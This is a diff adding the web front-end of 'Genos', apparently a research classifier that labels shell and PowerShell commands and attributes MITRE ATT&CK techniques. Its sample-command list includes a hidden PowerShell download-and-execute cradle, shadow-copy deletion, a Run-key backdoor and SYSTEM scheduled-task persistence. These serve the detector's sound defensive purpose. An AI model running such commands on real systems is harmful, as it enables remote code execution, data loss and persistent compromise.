@@ -1,0 +1,1058 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Genos — Command Threat Intelligence</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #0d1117;
+      --surface: #161b22;
+      --surface2: #1c2330;
+      --border: #30363d;
+      --text: #e6edf3;
+      --muted: #8b949e;
+      --accent: #58a6ff;
+      --benign: #3fb950;
+      --suspicious: #d29922;
+      --malicious: #f85149;
+      --radius: 8px;
+      --font: 'Segoe UI', system-ui, sans-serif;
+      --mono: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font);
+      min-height: 100vh;
+      padding: 2rem 1rem 4rem;
+    }
+
+    /* ---- Layout ---- */
+    .container { max-width: 900px; margin: 0 auto; }
+
+    /* ---- Header ---- */
+    header { margin-bottom: 2.5rem; text-align: center; }
+    header h1 {
+      font-size: 2rem;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+    }
+    header h1 span { color: var(--accent); }
+    header p {
+      margin-top: .6rem;
+      color: var(--muted);
+      font-size: .95rem;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+      line-height: 1.6;
+    }
+    .badge-row {
+      display: flex;
+      gap: .5rem;
+      justify-content: center;
+      margin-top: 1rem;
+      flex-wrap: wrap;
+    }
+    .badge {
+      font-size: .72rem;
+      font-weight: 600;
+      letter-spacing: .5px;
+      text-transform: uppercase;
+      padding: .25rem .65rem;
+      border-radius: 20px;
+      border: 1px solid var(--border);
+      color: var(--muted);
+    }
+
+    /* ---- Panel ---- */
+    .panel {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.5rem;
+      margin-bottom: 1.5rem;
+    }
+    .panel-title {
+      font-size: .75rem;
+      font-weight: 600;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      color: var(--muted);
+      margin-bottom: 1rem;
+    }
+
+    /* ---- Examples ---- */
+    .examples-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+      gap: .75rem;
+    }
+    .example-card {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: .85rem 1rem;
+      cursor: pointer;
+      transition: border-color .15s, background .15s;
+    }
+    .example-card:hover { background: #212830; border-color: var(--accent); }
+    .example-card .ex-label {
+      font-size: .7rem;
+      font-weight: 700;
+      letter-spacing: .8px;
+      text-transform: uppercase;
+      margin-bottom: .4rem;
+    }
+    .example-card .ex-cmd {
+      font-family: var(--mono);
+      font-size: .78rem;
+      color: var(--text);
+      word-break: break-all;
+      line-height: 1.5;
+    }
+    .label-benign     { color: var(--benign); }
+    .label-suspicious { color: var(--suspicious); }
+    .label-malicious  { color: var(--malicious); }
+
+    /* ---- Input ---- */
+    .input-row { display: flex; gap: .75rem; }
+    textarea {
+      flex: 1;
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      color: var(--text);
+      font-family: var(--mono);
+      font-size: .85rem;
+      padding: .75rem 1rem;
+      resize: vertical;
+      min-height: 80px;
+      outline: none;
+      transition: border-color .15s;
+    }
+    textarea:focus { border-color: var(--accent); }
+    textarea::placeholder { color: var(--muted); }
+
+    button#scanBtn {
+      background: var(--accent);
+      color: #0d1117;
+      border: none;
+      border-radius: var(--radius);
+      font-size: .9rem;
+      font-weight: 700;
+      padding: 0 1.5rem;
+      cursor: pointer;
+      white-space: nowrap;
+      align-self: flex-end;
+      height: 44px;
+      transition: opacity .15s;
+    }
+    button#scanBtn:disabled { opacity: .5; cursor: not-allowed; }
+    button#scanBtn:hover:not(:disabled) { opacity: .88; }
+
+    /* ---- Results ---- */
+    #results { display: none; }
+
+    /* Tier 1: Verdict hero */
+    .verdict-hero {
+      border-radius: 8px;
+      padding: 1.5rem 1.75rem 1.5rem 2rem;
+      margin-bottom: 1.5rem;
+      position: relative;
+      overflow: hidden;
+    }
+    .verdict-hero::before {
+      content: '';
+      position: absolute;
+      left: 0; top: 0; bottom: 0;
+      width: 5px;
+    }
+    .verdict-hero.Benign     { background: rgba(63,185,80,.07); }
+    .verdict-hero.Benign::before  { background: var(--benign); }
+    .verdict-hero.Suspicious { background: rgba(210,153,34,.07); }
+    .verdict-hero.Suspicious::before { background: var(--suspicious); }
+    .verdict-hero.Malicious  { background: rgba(248,81,73,.07); }
+    .verdict-hero.Malicious::before  { background: var(--malicious); }
+
+    .verdict-top {
+      display: flex;
+      align-items: baseline;
+      gap: 1.1rem;
+      flex-wrap: wrap;
+    }
+    .verdict-word {
+      font-size: 2.6rem;
+      font-weight: 900;
+      letter-spacing: -1.5px;
+      line-height: 1;
+    }
+    .verdict-hero.Benign     .verdict-word { color: var(--benign); }
+    .verdict-hero.Suspicious .verdict-word { color: var(--suspicious); }
+    .verdict-hero.Malicious  .verdict-word { color: var(--malicious); }
+
+    .verdict-conf-num {
+      font-size: 1.6rem;
+      font-weight: 700;
+      color: var(--text);
+      font-family: var(--mono);
+    }
+    .verdict-conf-label { font-size: .82rem; color: #adbac7; margin-left: .2rem; }
+
+    .conf-track {
+      height: 6px;
+      background: rgba(255,255,255,.08);
+      border-radius: 3px;
+      overflow: hidden;
+      margin-top: .9rem;
+      max-width: 420px;
+    }
+    .conf-fill {
+      height: 100%;
+      border-radius: 3px;
+      transition: width .5s ease;
+    }
+    .conf-fill.Benign     { background: var(--benign); }
+    .conf-fill.Suspicious { background: var(--suspicious); }
+    .conf-fill.Malicious  { background: var(--malicious); }
+
+    /* Class probabilities */
+    .prob-row { display: flex; gap: .5rem; flex-wrap: wrap; margin-top: .9rem; }
+    .prob-pill {
+      font-size: .8rem;
+      font-weight: 600;
+      border-radius: 5px;
+      padding: .28rem .75rem;
+    }
+    .prob-pill.Benign     { background: rgba(63,185,80,.12);  color: #56d364; border: 1px solid rgba(63,185,80,.3); }
+    .prob-pill.Suspicious { background: rgba(210,153,34,.12); color: #e3b341; border: 1px solid rgba(210,153,34,.3); }
+    .prob-pill.Malicious  { background: rgba(248,81,73,.12);  color: #ff7b72; border: 1px solid rgba(248,81,73,.3); }
+    .prob-pill .pval { font-family: var(--mono); font-size: .78rem; }
+
+    /* ---- Sections (Tier 2) ---- */
+    .section { margin-top: 1.4rem; }
+    .section-title {
+      font-size: .78rem;
+      font-weight: 700;
+      letter-spacing: .6px;
+      text-transform: uppercase;
+      color: #c9d1d9;
+      margin-bottom: .8rem;
+      padding-bottom: .4rem;
+      border-bottom: 1px solid var(--border);
+    }
+
+    /* Tier 3: collapsible details */
+    details.result-details { margin-top: 1.4rem; }
+    details.result-details > summary {
+      font-size: .78rem;
+      font-weight: 700;
+      letter-spacing: .6px;
+      text-transform: uppercase;
+      color: #adbac7;
+      cursor: pointer;
+      user-select: none;
+      list-style: none;
+      display: flex;
+      align-items: center;
+      gap: .5rem;
+      padding-bottom: .4rem;
+      border-bottom: 1px solid var(--border);
+      transition: color .15s;
+    }
+    details.result-details > summary::-webkit-details-marker { display: none; }
+    details.result-details > summary::before {
+      content: '\25B6';
+      font-size: .55rem;
+      transition: transform .15s;
+      color: var(--muted);
+    }
+    details.result-details[open] > summary::before { transform: rotate(90deg); }
+    details.result-details > summary:hover { color: #c9d1d9; }
+    .details-body { margin-top: .8rem; }
+
+    /* ---- Analyst hint ---- */
+    .analyst-hint {
+      font-size: .88rem;
+      color: #c9d1d9;
+      line-height: 1.65;
+      padding: .7rem 1rem;
+      background: var(--surface2);
+      border-left: 3px solid rgba(88,166,255,.5);
+      border-radius: 0 5px 5px 0;
+      margin-bottom: .7rem;
+    }
+
+    /* ---- Result sub-panels ---- */
+    .sub-panel {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: .8rem 1rem;
+      margin-bottom: .5rem;
+    }
+    .sub-panel-title {
+      font-size: .7rem;
+      font-weight: 700;
+      letter-spacing: .7px;
+      text-transform: uppercase;
+      color: #c9d1d9;
+      margin-bottom: .5rem;
+    }
+
+    /* ---- MITRE chips ---- */
+    .mitre-list { display: flex; flex-wrap: wrap; gap: .5rem; }
+    .mitre-chip {
+      font-size: .82rem;
+      background: rgba(88,166,255,.08);
+      border: 1px solid rgba(88,166,255,.25);
+      border-radius: 5px;
+      padding: .35rem .85rem;
+      display: flex;
+      align-items: center;
+      gap: .6rem;
+    }
+    .mitre-chip strong { color: var(--accent); font-family: var(--mono); }
+    .mitre-chip .mconf { font-size: .72rem; color: #adbac7; font-family: var(--mono); }
+
+    /* ---- Tags / feature list ---- */
+    .tag-list { display: flex; flex-wrap: wrap; gap: .4rem; }
+    .tag {
+      font-size: .77rem;
+      background: var(--bg);
+      border: 1px solid #444c56;
+      border-radius: 4px;
+      padding: .22rem .6rem;
+      color: #c9d1d9;
+    }
+    .tag.highlight { border-color: rgba(88,166,255,.5);  color: #79c0ff; }
+    .tag.rule      { border-color: rgba(210,153,34,.5);  color: #e3b341; }
+    .tag.lolbin    { border-color: rgba(248,81,73,.5);   color: #ff7b72; }
+
+    /* ---- Boolean flags ---- */
+    .bool-row { display: flex; flex-wrap: wrap; gap: .4rem; }
+    .bool-flag {
+      font-size: .75rem;
+      padding: .2rem .55rem;
+      border-radius: 4px;
+      font-family: var(--mono);
+    }
+    .bool-flag.on { background: rgba(248,81,73,.12); color: #ff7b72; border: 1px solid rgba(248,81,73,.3); }
+
+    /* ---- Key-value grid ---- */
+    .kv-grid {
+      display: grid;
+      grid-template-columns: auto 1fr;
+      gap: .45rem 1.4rem;
+      font-size: .84rem;
+    }
+    .kv-key { color: #adbac7; white-space: nowrap; align-self: start; padding-top: 1px; }
+    .kv-val { color: #e6edf3; word-break: break-all; }
+    .kv-val.code { font-family: var(--mono); font-size: .81rem; color: #c9d1d9; }
+
+    /* ---- Obfuscation banner ---- */
+    .obfuscation-banner {
+      display: flex;
+      align-items: flex-start;
+      gap: .9rem;
+      background: rgba(210,153,34,.09);
+      border: 1px solid rgba(210,153,34,.4);
+      border-left: 4px solid #e3b341;
+      border-radius: 6px;
+      padding: .85rem 1.1rem;
+      margin-bottom: 1.1rem;
+    }
+    .obfuscation-banner .ob-icon {
+      font-size: 1.1rem;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+    .obfuscation-banner .ob-body { flex: 1; }
+    .obfuscation-banner .ob-title {
+      font-weight: 700;
+      font-size: .88rem;
+      color: #e3b341;
+      margin-bottom: .3rem;
+    }
+    .obfuscation-banner .ob-markers {
+      display: flex;
+      flex-wrap: wrap;
+      gap: .3rem;
+      margin-bottom: .55rem;
+    }
+    .obfuscation-banner .ob-marker {
+      font-family: var(--mono);
+      font-size: .72rem;
+      background: rgba(210,153,34,.15);
+      border: 1px solid rgba(210,153,34,.3);
+      border-radius: 4px;
+      padding: .15rem .5rem;
+      color: #e3b341;
+    }
+    .obfuscation-banner .ob-label {
+      font-size: .72rem;
+      font-weight: 700;
+      letter-spacing: .6px;
+      text-transform: uppercase;
+      color: #adbac7;
+      margin-bottom: .3rem;
+    }
+    .ob-deobf {
+      font-family: var(--mono);
+      font-size: .78rem;
+      background: rgba(0,0,0,.25);
+      border: 1px solid rgba(210,153,34,.2);
+      border-radius: 4px;
+      padding: .6rem .8rem;
+      overflow: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+      color: #c9d1d9;
+      max-height: 180px;
+      line-height: 1.5;
+    }
+
+    /* ---- Stage badge ---- */
+    .stage-badge {
+      display: inline-block;
+      font-size: .85rem;
+      font-weight: 700;
+      padding: .32rem 1rem;
+      border-radius: 20px;
+      background: rgba(88,166,255,.1);
+      color: var(--accent);
+      border: 1px solid rgba(88,166,255,.3);
+      margin-bottom: .7rem;
+    }
+
+    /* ---- Rule strength ---- */
+    .rule-strength {
+      display: inline-block;
+      font-size: .68rem;
+      font-weight: 700;
+      padding: .12rem .5rem;
+      border-radius: 4px;
+      text-transform: uppercase;
+      letter-spacing: .5px;
+      margin-left: .4rem;
+    }
+    .rule-strength.strong  { background: rgba(248,81,73,.15);  color: #ff7b72; }
+    .rule-strength.medium  { background: rgba(210,153,34,.15); color: #e3b341; }
+    .rule-strength.weak    { background: rgba(88,166,255,.1);  color: var(--accent); }
+    .rule-strength.none    { background: var(--surface2); color: var(--muted); }
+
+    /* ---- Raw JSON ---- */
+    details.json-details { margin-top: 1rem; }
+    details.json-details > summary {
+      font-size: .75rem;
+      font-weight: 600;
+      letter-spacing: .5px;
+      text-transform: uppercase;
+      color: var(--muted);
+      cursor: pointer;
+      user-select: none;
+      list-style: none;
+    }
+    details.json-details > summary::-webkit-details-marker { display: none; }
+    details.json-details > summary:hover { color: var(--text); }
+    pre#rawJson {
+      margin-top: .6rem;
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1rem;
+      font-family: var(--mono);
+      font-size: .75rem;
+      overflow: auto;
+      max-height: 400px;
+      line-height: 1.55;
+      color: var(--text);
+    }
+
+    /* ---- Error ---- */
+    #errorBox {
+      display: none;
+      background: rgba(248,81,73,.12);
+      border: 1px solid rgba(248,81,73,.4);
+      border-radius: var(--radius);
+      padding: .85rem 1rem;
+      color: #f85149;
+      font-size: .88rem;
+    }
+
+    /* ---- Spinner ---- */
+    .spinner {
+      display: none;
+      width: 16px; height: 16px;
+      border: 2px solid rgba(88,166,255,.3);
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin .7s linear infinite;
+      margin: 0 auto;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ---- Footer ---- */
+    footer {
+      text-align: center;
+      margin-top: 3rem;
+      font-size: .78rem;
+      color: var(--muted);
+    }
+
+    /* ---- Tooltip ---- */
+    .tip-wrap {
+      position: relative;
+      display: inline-flex;
+      align-items: center;
+      vertical-align: middle;
+      margin-left: .3rem;
+    }
+    .tip-icon {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 14px; height: 14px;
+      border-radius: 50%;
+      background: rgba(139,148,158,.2);
+      border: 1px solid rgba(139,148,158,.35);
+      color: #8b949e;
+      font-size: .62rem;
+      font-weight: 700;
+      cursor: default;
+      font-style: normal;
+      line-height: 1;
+      flex-shrink: 0;
+    }
+    .tip-box {
+      display: none;
+      position: absolute;
+      bottom: calc(100% + 6px);
+      left: 50%;
+      transform: translateX(-50%);
+      background: #2d333b;
+      border: 1px solid #444c56;
+      border-radius: 6px;
+      padding: .55rem .75rem;
+      width: 240px;
+      font-size: .76rem;
+      color: #adbac7;
+      line-height: 1.55;
+      z-index: 100;
+      pointer-events: none;
+      font-family: var(--font);
+      font-weight: 400;
+      text-transform: none;
+      letter-spacing: 0;
+      box-shadow: 0 4px 16px rgba(0,0,0,.4);
+    }
+    .tip-box strong { color: #e6edf3; }
+    .tip-box::after {
+      content: '';
+      position: absolute;
+      top: 100%; left: 50%;
+      transform: translateX(-50%);
+      border: 5px solid transparent;
+      border-top-color: #444c56;
+    }
+    .tip-wrap:hover .tip-box { display: block; }
+  </style>
+</head>
+<body>
+<div class="container">
+
+  <!-- Header -->
+  <header>
+    <h1><span>Genos</span> — Command Threat Intelligence</h1>
+    <p>
+      A two-stage neural pipeline for real-time malicious command detection
+      and <strong>MITRE ATT&CK</strong> technique attribution, powered by
+      <em>CodeBERT</em> fine-tuned on shell and PowerShell corpora.
+    </p>
+    <div class="badge-row">
+      <span class="badge">CodeBERT</span>
+      <span class="badge">MITRE ATT&amp;CK</span>
+      <span class="badge">Deobfuscation</span>
+      <span class="badge">3-class verdict</span>
+      <span class="badge">IEEE Research</span>
+    </div>
+  </header>
+
+  <!-- How it works -->
+  <div class="panel">
+    <div class="panel-title">How it works</div>
+    <div class="kv-grid">
+      <span class="kv-key">Stage 1 — Gatekeeper</span>
+      <span class="kv-val">A fine-tuned CodeBERT 3-class classifier outputs Benign / Suspicious / Malicious, aided by auxiliary ordinal-risk and non-benign binary heads.</span>
+      <span class="kv-key">Stage 2 — Behavior Encoder</span>
+      <span class="kv-val">A second CodeBERT model predicts the ATT&amp;CK kill-chain stage and action type to generate MITRE technique attributions.</span>
+      <span class="kv-key">Deobfuscation</span>
+      <span class="kv-val">Up to 5 entropy-aware passes unwrap Base64, PowerShell char constructions, string concatenation, and hex escapes before inference.</span>
+      <span class="kv-key">Rule engine</span>
+      <span class="kv-val">Deterministic heuristics generate prior candidate masks that bias neural routing for high-confidence known patterns.</span>
+    </div>
+  </div>
+
+  <!-- Example commands -->
+  <div class="panel">
+    <div class="panel-title">Example commands — click to load</div>
+    <div class="examples-grid" id="examplesGrid"></div>
+  </div>
+
+  <!-- Input -->
+  <div class="panel">
+    <div class="panel-title">Scan a command</div>
+    <div class="input-row">
+      <textarea id="cmdInput" placeholder="Enter a shell or PowerShell command…" rows="3"></textarea>
+      <button id="scanBtn" onclick="runScan()">Scan</button>
+    </div>
+    <div style="margin-top:.75rem">
+      <div class="spinner" id="spinner"></div>
+      <div id="errorBox"></div>
+    </div>
+  </div>
+
+  <!-- Results -->
+  <div id="results" class="panel">
+    <div class="panel-title">Analysis Result</div>
+
+    <!-- Obfuscation banner (shown only when obfuscation detected) -->
+    <div id="obfuscationBanner" style="display:none"></div>
+
+    <!-- TIER 1 — Verdict hero -->
+    <div id="verdictHero" class="verdict-hero">
+      <div class="verdict-top">
+        <span id="verdictBadge" class="verdict-word"></span>
+        <span><span id="confPct" class="verdict-conf-num"></span><span class="verdict-conf-label"> confidence</span></span>
+      </div>
+      <div class="conf-track"><div id="confFill" class="conf-fill" style="width:0%"></div></div>
+      <div id="probRow" class="prob-row"></div>
+    </div>
+
+    <!-- TIER 2 — Behavior -->
+    <div class="section" id="behaviorSection" style="display:none">
+      <div class="section-title">Behavior</div>
+      <div id="behaviorContent"></div>
+    </div>
+
+    <!-- TIER 2 — MITRE ATT&CK -->
+    <div class="section" id="mitreSection" style="display:none">
+      <div class="section-title">MITRE ATT&amp;CK Techniques</div>
+      <div class="mitre-list" id="mitreList"></div>
+    </div>
+
+    <!-- TIER 2 — Deobfuscated payload (kept for legacy, driven by banner above) -->
+    <div id="deobfSection" style="display:none">
+      <pre id="deobfText"></pre>
+    </div>
+
+    <!-- TIER 3 — Evidence (collapsed) -->
+    <details class="result-details" id="evidenceSection" style="display:none">
+      <summary>Evidence</summary>
+      <div class="details-body" id="evidenceContent"></div>
+    </details>
+
+    <!-- TIER 3 — Gatekeeper (collapsed) -->
+    <details class="result-details" id="gatekeeperSection" style="display:none">
+      <summary>Gatekeeper</summary>
+      <div class="details-body" id="gatekeeperContent"></div>
+    </details>
+
+    <!-- TIER 3 — Meta (collapsed) -->
+    <details class="result-details" id="metaSection" style="display:none">
+      <summary>Meta</summary>
+      <div class="details-body"><div class="kv-grid" id="metaGrid"></div></div>
+    </details>
+
+    <!-- Raw JSON toggle -->
+    <details class="json-details">
+      <summary>Raw JSON response</summary>
+      <pre id="rawJson"></pre>
+    </details>
+  </div>
+
+</div>
+
+<footer>Genos API &mdash; IEEE Research Programme</footer>
+
+<script>
+  // ---- Example commands ----
+  const EXAMPLES = [
+    {
+      label: 'Benign',
+      category: 'benign',
+      cmd: 'Get-ChildItem -Path C:\\Users -Recurse -Filter *.txt'
+    },
+    {
+      label: 'Benign',
+      category: 'benign',
+      cmd: 'ping -c 4 8.8.8.8'
+    },
+    {
+      label: 'Benign',
+      category: 'benign',
+      cmd: 'netstat -antp'
+    },
+    {
+      label: 'Suspicious',
+      category: 'suspicious',
+      cmd: 'net user administrator'
+    },
+    {
+      label: 'Suspicious',
+      category: 'suspicious',
+      cmd: 'whoami /all && net localgroup administrators'
+    },
+    {
+      label: 'Suspicious',
+      category: 'suspicious',
+      cmd: 'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://10.0.0.1/payload.ps1\')"'
+    },
+    {
+      label: 'Malicious',
+      category: 'malicious',
+      cmd: 'vssadmin delete shadows /all /quiet'
+    },
+    {
+      label: 'Malicious',
+      category: 'malicious',
+      cmd: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "C:\\Windows\\Temp\\svchost.exe" /f'
+    },
+    {
+      label: 'Malicious',
+      category: 'malicious',
+      cmd: 'schtasks /create /tn "SystemUpdate" /tr "C:\\Temp\\malware.exe" /sc onlogon /ru SYSTEM /f'
+    },
+  ];
+
+  // Render example cards
+  const grid = document.getElementById('examplesGrid');
+  EXAMPLES.forEach(ex => {
+    const card = document.createElement('div');
+    card.className = 'example-card';
+    card.innerHTML = `<div class="ex-label label-${ex.category}">${ex.label}</div><div class="ex-cmd">${escHtml(ex.cmd)}</div>`;
+    card.onclick = () => {
+      document.getElementById('cmdInput').value = ex.cmd;
+      document.getElementById('cmdInput').focus();
+    };
+    grid.appendChild(card);
+  });
+
+  function escHtml(s) {
+    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+  }
+
+  // ---- Scan ----
+  async function runScan() {
+    const cmd = document.getElementById('cmdInput').value.trim();
+    if (!cmd) return;
+
+    const btn = document.getElementById('scanBtn');
+    const spinner = document.getElementById('spinner');
+    const errorBox = document.getElementById('errorBox');
+    const results = document.getElementById('results');
+
+    btn.disabled = true;
+    spinner.style.display = 'block';
+    errorBox.style.display = 'none';
+    results.style.display = 'none';
+
+    try {
+      const resp = await fetch('/scan/free', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ command: cmd })
+      });
+      const data = await resp.json();
+
+      if (!resp.ok) {
+        throw new Error(data.error || `HTTP ${resp.status}`);
+      }
+
+      renderResults(data);
+      results.style.display = 'block';
+      results.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    } catch (err) {
+      errorBox.textContent = 'Error: ' + err.message;
+      errorBox.style.display = 'block';
+    } finally {
+      btn.disabled = false;
+      spinner.style.display = 'none';
+    }
+  }
+
+  // Allow Enter (without shift) to trigger scan from the textarea
+  document.getElementById('cmdInput').addEventListener('keydown', e => {
+    if (e.key === 'Enter' && !e.shiftKey) {
+      e.preventDefault();
+      runScan();
+    }
+  });
+
+  function hide(id) { document.getElementById(id).style.display = 'none'; }
+  function show(id, display='block') { document.getElementById(id).style.display = display; }
+
+  function tags(items, cls='') {
+    return items.map(t => `<div class="tag ${cls}">${escHtml(String(t))}</div>`).join('');
+  }
+
+  // Render a tooltip icon that appears after the key label
+  function tip(text) {
+    return `<span class="tip-wrap"><i class="tip-icon">?</i><span class="tip-box">${text}</span></span>`;
+  }
+
+  const TIPS = {
+    'Model type': `<strong>behavior_encoder</strong> — neural CodeBERT model predicted the kill-chain stage and action tags.<br><br><strong>heuristic_bootstrap</strong> — behavior weights not loaded; stage and tags were inferred from deterministic rule + feature logic. <em>stage_confidence</em> will be null.`,
+    'Routing policy': `How the Gatekeeper chose the final label.<br><br><strong>model_top_class</strong> — the model's highest-probability class won outright. No override or fallback rule fired.`,
+    'Decision margin': `Gap (in %) between the top-class probability and the runner-up. A low margin (&lt;12%) signals the model was uncertain and may trigger additional analysis.`,
+  };
+
+  function kvRow(key, val, isCode = false) {
+    if (val == null || val === '' || (Array.isArray(val) && !val.length)) return '';
+    const display = Array.isArray(val) ? val.join(', ') : String(val);
+    const tooltip = TIPS[key] ? tip(TIPS[key]) : '';
+    return `<span class="kv-key">${escHtml(key)}${tooltip}</span><span class="kv-val${isCode ? ' code' : ''}">${escHtml(display)}</span>`;
+  }
+
+  function renderResults(d) {
+    const label = d.label || 'Unknown';
+
+    // ── Tier 1: Verdict hero ──
+    document.getElementById('verdictHero').className = 'verdict-hero ' + label;
+    document.getElementById('verdictBadge').textContent = label;
+
+    const conf = parseFloat(d.label_confidence || 0);
+    const pct = conf <= 1 ? (conf * 100).toFixed(1) : conf.toFixed(1);
+    const fill = document.getElementById('confFill');
+    fill.style.width = pct + '%';
+    fill.className = 'conf-fill ' + label;
+    document.getElementById('confPct').textContent = pct + '%';
+
+    // Color-coded class probability pills
+    const probRow = document.getElementById('probRow');
+    probRow.innerHTML = '';
+    const probs = d.label_probabilities || d.class_probabilities;
+    if (probs) {
+      const MAP = { benign: 'Benign', malicious: 'Malicious', suspicious: 'Suspicious', context_dependent: 'Suspicious' };
+      const seen = new Set();
+      for (const [k, v] of Object.entries(probs)) {
+        const display = MAP[k.toLowerCase()] || k;
+        if (seen.has(display)) continue;
+        seen.add(display);
+        const pv = parseFloat(v);
+        const pvPct = (pv <= 1 ? pv * 100 : pv).toFixed(1);
+        const pill = document.createElement('div');
+        pill.className = 'prob-pill ' + display;
+        pill.innerHTML = `${display} <span class="pval">${pvPct}%</span>`;
+        probRow.appendChild(pill);
+      }
+    }
+
+    // ── Tier 2: Behavior ──
+    const beh = d.behavior;
+    const hint = d.analyst_hint || d.reason;
+    if (beh || hint) {
+      const bc = document.getElementById('behaviorContent');
+      let html = '';
+      if (beh && beh.stage) html += `<div class="stage-badge">${escHtml(beh.stage)}</div>`;
+      if (hint) {
+        html += `<div class="analyst-hint">${escHtml(hint)}</div>`;
+      }
+      if (beh && beh.action_tags && beh.action_tags.length) {
+        html += `<div class="sub-panel" style="margin-top:.7rem"><div class="sub-panel-title">Action tags</div><div class="tag-list">${tags(beh.action_tags, 'highlight')}</div></div>`;
+      }
+      const meta = [];
+      if (beh && beh.model_type) meta.push(['Model type', beh.model_type]);
+      if (d.routing_policy) meta.push(['Routing policy', d.routing_policy]);
+      if (d.decision_margin != null) meta.push(['Decision margin', String(d.decision_margin)]);
+      if (meta.length) {
+        html += `<div class="kv-grid" style="margin-top:.75rem">${meta.map(([k,v]) => kvRow(k,v)).join('')}</div>`;
+      }
+      bc.innerHTML = html;
+      show('behaviorSection');
+    } else {
+      hide('behaviorSection');
+    }
+
+    // ── Tier 2: MITRE codes ──
+    const mitreCodes = d.MITRE_codes || [];
+    const mitreList = document.getElementById('mitreList');
+    mitreList.innerHTML = '';
+    if (mitreCodes.length) {
+      mitreCodes.forEach(m => {
+        const confPct = (parseFloat(m.confidence) <= 1
+          ? parseFloat(m.confidence) * 100
+          : parseFloat(m.confidence)).toFixed(1);
+        const chip = document.createElement('div');
+        chip.className = 'mitre-chip';
+        chip.innerHTML = `<strong>${escHtml(m.code)}</strong><span class="mconf">${confPct}%</span>`;
+        mitreList.appendChild(chip);
+      });
+      show('mitreSection');
+    } else {
+      hide('mitreSection');
+    }
+
+    // ── Obfuscation banner ──
+    const deobf = d.deobfuscated_cmd || d.decoded_payload;
+    const usesObfuscation = deobf || (d.evidence && (d.evidence.uses_obfuscation || (d.evidence.obfuscation_markers && d.evidence.obfuscation_markers.length)));
+    const banner = document.getElementById('obfuscationBanner');
+    if (usesObfuscation) {
+      const markers = (d.evidence && d.evidence.obfuscation_markers) || [];
+      let bhtml = `<div class="obfuscation-banner"><div class="ob-icon">⚠</div><div class="ob-body">`;
+      bhtml += `<div class="ob-title">Obfuscated input detected</div>`;
+      if (markers.length) {
+        bhtml += `<div class="ob-markers">${markers.map(m => `<span class="ob-marker">${escHtml(String(m))}</span>`).join('')}</div>`;
+      }
+      if (deobf) {
+        bhtml += `<div class="ob-label">Deobfuscated command analysed</div>`;
+        bhtml += `<div class="ob-deobf">${escHtml(deobf)}</div>`;
+      }
+      bhtml += `</div></div>`;
+      banner.innerHTML = bhtml;
+      show('obfuscationBanner');
+    } else {
+      banner.innerHTML = '';
+      hide('obfuscationBanner');
+    }
+    // keep legacy element hidden (data already shown in banner)
+    hide('deobfSection');
+
+    // ── Tier 3: Evidence (collapsed by default) ──
+    const ev = d.evidence;
+    if (ev && typeof ev === 'object') {
+      const ec = document.getElementById('evidenceContent');
+      let html = '';
+
+      const ctxRows = [
+        kvRow('Platform', ev.platform),
+        kvRow('Executable', ev.executable, true),
+        kvRow('Subcommand', ev.subcommand, true),
+        kvRow('Interpreter', ev.interpreter, true),
+        kvRow('Execution style', ev.execution_style),
+        kvRow('High-signal flags', ev.high_signal_flags, true),
+      ].filter(Boolean).join('');
+      if (ctxRows) {
+        html += `<div class="sub-panel"><div class="sub-panel-title">Command context</div><div class="kv-grid">${ctxRows}</div></div>`;
+      }
+
+      const artifactRows = [
+        kvRow('File paths', ev.file_paths, true),
+        kvRow('Registry paths', ev.registry_paths, true),
+        kvRow('Local targets', ev.local_targets, true),
+      ].filter(Boolean).join('');
+      if (artifactRows) {
+        html += `<div class="sub-panel"><div class="sub-panel-title">Artifacts</div><div class="kv-grid">${artifactRows}</div></div>`;
+      }
+
+      const netItems = [
+        ...(ev.remote_targets || []),
+        ...(ev.urls || []),
+        ...(ev.domains || []),
+        ...(ev.ips || []),
+        ...(ev.ports || []),
+      ];
+      if (netItems.length) {
+        html += `<div class="sub-panel"><div class="sub-panel-title">Network indicators</div><div class="tag-list">${tags(netItems)}</div></div>`;
+      }
+
+      if (ev.lolbin_matches && ev.lolbin_matches.length) {
+        html += `<div class="sub-panel"><div class="sub-panel-title">LOLBin matches</div><div class="tag-list">${tags(ev.lolbin_matches, 'lolbin')}</div></div>`;
+      }
+
+      if (ev.semantic_features && ev.semantic_features.length) {
+        html += `<div class="sub-panel"><div class="sub-panel-title">Semantic features</div><div class="tag-list">${tags(ev.semantic_features, 'highlight')}</div></div>`;
+      }
+
+      if (ev.fired_rules && ev.fired_rules.length) {
+        const strength = ev.rule_strength || 'none';
+        html += `<div class="sub-panel"><div class="sub-panel-title">Fired rules <span class="rule-strength ${escHtml(strength)}">${escHtml(strength)}</span></div><div class="tag-list">${tags(ev.fired_rules, 'rule')}</div></div>`;
+      }
+
